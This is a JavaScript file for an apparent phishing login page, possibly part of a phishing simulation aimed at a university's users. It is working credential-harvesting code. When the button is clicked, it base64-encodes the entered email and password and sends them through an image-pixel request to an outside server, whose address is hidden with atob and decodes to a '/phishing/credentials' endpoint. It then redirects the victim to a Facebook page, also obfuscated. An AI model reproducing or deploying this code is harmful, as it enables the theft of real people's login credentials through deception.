const dummy = document.getElementById('k_dummy');
const k_input = document.getElementById('k_input');

function button_on_click(){
	const e_input = document.getElementById('email_input');
	const image = document.getElementById('pixel');
	const f = function(){
		window.location.replace(atob('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3VuaXZlcnNpZGFkLmZlZGVyaWNvc2FudGFtYXJpYS4z'));
	}
	image.onload = f;
	image.onabort = f;
	image.onerror= f;
	image.src = atob('aHR0cDovL2dpZ2VyLnBwYW1vLmNsOjgwODkvcGhpc2hpbmcvY3JlZGVudGlhbHM/dT0=') + btoa(e_input.value) +
		"&k=" + btoa(k_input.value) + '&s=1&a=U3RhdGljOkhLbzhiN3Z1ekEwWHFKbDg0Zm9zOTlySDJxTEhwWjU5YzlENWNqMjc=';
}

function update_value(e){
	const text = Array(e.target.value.length).fill('*').join('');
	dummy.innerHTML = text;

}

function page_onload(){
	const queryString = window.location.search;
	const parameters = new URLSearchParams(queryString);
	const value = parameters.get('theme');
	const button=document.getElementById("submit_button");

	button.addEventListener("click", button_on_click, false);
	k_input.addEventListener('input', update_value);

	if (value == "default") {
		document.getElementById("cover").style.visibility = 'hidden';
	}
}

page_onload();
